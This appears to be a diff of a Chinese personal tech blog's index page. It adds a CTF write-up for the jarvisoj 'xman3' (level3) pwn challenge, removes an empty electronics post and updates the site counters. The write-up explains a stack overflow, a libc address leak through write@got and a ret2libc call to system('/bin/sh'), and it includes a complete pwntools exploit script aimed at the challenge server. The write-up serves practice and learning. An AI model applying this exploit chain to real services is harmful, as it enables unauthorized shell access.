@@ -259,6 +259,161 @@
   
   
   <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/05/09/jarvisoj-xman3/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Ice_bag(WXJ)">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Ice_bag的技术博客，欢迎！">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+                
+                <a class="post-title-link" href="/2019/05/09/jarvisoj-xman3/" itemprop="url">jarvisoj_xman3</a></h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2019-05-09T22:49:57+08:00">
+                2019-05-09
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pwn/" itemprop="url" rel="index">
+                    <span itemprop="name">pwn</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><p>read函数没有限制输入的长度，存在栈溢出。</p>
+<h1 id="计算栈溢出偏移量"><a href="#计算栈溢出偏移量" class="headerlink" title="计算栈溢出偏移量"></a>计算栈溢出偏移量</h1><p><img src="/2019/05/09/jarvisoj-xman3/1.pgn" alt="ida反汇编"><br>关键点：sub  esp,88h<br>        lea  eax,[ebp+buf]<br>ida说eax是read函数的buf，所以偏移量就是0x88，我们需要覆盖的是ret地址，中间还隔了一个ebp，所以padding为0x88+4。</p>
+<h1 id="计算libc偏移量"><a href="#计算libc偏移量" class="headerlink" title="计算libc偏移量"></a>计算libc偏移量</h1><p>由于是动态链接库，每次加载的基址都不一样，所以需要使用write泄露出某个libc函数的真实地址，再根据库中函数相当位置相同<br>推算出别的库函数的实际地址。</p>
+<h2 id="write函数"><a href="#write函数" class="headerlink" title="write函数"></a>write函数</h2><p>三个参数，通过栈传递，分别为：nbytes,buf,fd。在栈中的顺序大概是这样：</p>
+<pre><code>| 栈顶 |
+|  fd  |
+|  buf |
+|nbytes|
+</code></pre><p>因此，我们要伪造的泄露write地址的栈帧为：<br>                        |   栈顶   |<br>                        | write@plt|<br>                        |return_add|<br>                        |    1     |<br>                        |write@got |<br>                        |    4     |<br>接下来程序输出的就是write的真实地址</p>
+<h2 id="ELF"><a href="#ELF" class="headerlink" title="ELF."></a>ELF.</h2><p>pwntools中的计算基址的神器，用法：<br>    ELF(“二进制文件路径”)<br>    ELF.symbols[‘’] 查看函数地址<br>    ELF.plt[‘’]同上<br>    ELF.got[‘’]同上<br>libcsearcher模块：<br>    libc.search(‘’)在库中寻找</p>
+<h2 id="基址偏移公式"><a href="#基址偏移公式" class="headerlink" title="基址偏移公式"></a>基址偏移公式</h2><p>write真实地址-write在libc中的地址=偏移量</p>
+<h2 id="return-addr"><a href="#return-addr" class="headerlink" title="return_addr"></a>return_addr</h2><p>计算到了偏移量，我们还不能停，因为重新加载程序会生成一个新的偏移量，所以这时我们要劫持程序<br>流程，再次进入vuln函数，所以return_add填入vuln的地址，再入vuln函数，再次栈溢出。</p>
+<h1 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h1><p>得到偏移量后，根据各函数在libc中的地址，我们很容易就能算出真实地址，接下来只需要调用system(/bin/sh)就完事了<br>system就一个参数，所以伪造的栈帧为：<br>                        |   栈顶   |<br>                        |return_add|<br>                        |  bin_add |<br>由于执行完就getshell了，所以return_addr瞎填就行，只要是四个字节。<br><img src="/2019/05/09/jarvisoj-xman3/2.pgn" alt="getsh"></p>
+<h1 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> LibcSearcher</span><br><span class="line"><span class="comment">#context.log_level='debug'</span></span><br><span class="line"></span><br><span class="line">level3=ELF(<span class="string">'./level3'</span>)</span><br><span class="line">vuln=level3.symbols[<span class="string">'vulnerable_function'</span>]</span><br><span class="line">write_plt=level3.plt[<span class="string">'write'</span>]</span><br><span class="line"><span class="comment">#libc=ELF('/lib/i386-linux-gnu/libc.so.6')</span></span><br><span class="line">libc=ELF(<span class="string">'./libc-2.19.so'</span>)</span><br><span class="line">write_got=level3.got[<span class="string">'write'</span>]</span><br><span class="line">p=remote(<span class="string">'pwn2.jarvisoj.com'</span>,<span class="number">9879</span>)</span><br><span class="line"><span class="comment">#p=process('./level3')</span></span><br><span class="line">p.recvline()</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">140</span>+p32(write_plt)+p32(vuln)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">4</span>))</span><br><span class="line">write=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"></span><br><span class="line">offset=write-libc.symbols[<span class="string">'write'</span>]</span><br><span class="line">system=offset+libc.symbols[<span class="string">'system'</span>]</span><br><span class="line">bin_sh=offset+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line">p.sendline(<span class="string">'a'</span>*<span class="number">140</span>+p32(system)+<span class="string">'aaaa'</span>+p32(bin_sh))</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/04/26/二进制学习/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1502,147 +1657,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/11/10/A-D转换，D-A转换/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="Ice_bag(WXJ)">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.gif">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Ice_bag的技术博客，欢迎！">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                <a class="post-title-link" href="/2018/11/10/A-D转换，D-A转换/" itemprop="url">A/D转换，D/A转换</a></h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-11-10T12:57:24+08:00">
-                2018-11-10
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/单片机/" itemprop="url" rel="index">
-                    <span itemprop="name">单片机</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            
-          
-        
-      
-    </div>
-    
-    
-    
-
-    
-
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
   </section>
 
   
@@ -1693,7 +1707,7 @@
               
                 <a href="/archives/">
               
-                  <span class="site-state-item-count">21</span>
+                  <span class="site-state-item-count">22</span>
                   <span class="site-state-item-name">日志</span>
                 </a>
               </div>
@@ -1704,7 +1718,7 @@
               
               <div class="site-state-item site-state-categories">
                 <a href="/文章分类/index.html">
-                  <span class="site-state-item-count">9</span>
+                  <span class="site-state-item-count">10</span>
                   <span class="site-state-item-name">分类</span>
                 </a>
               </div>
@@ -1715,7 +1729,7 @@
               
               <div class="site-state-item site-state-tags">
                 <a href="/标签/index.html">
-                  <span class="site-state-item-count">8</span>
+                  <span class="site-state-item-count">11</span>
                   <span class="site-state-item-name">标签</span>
                 </a>
               </div>
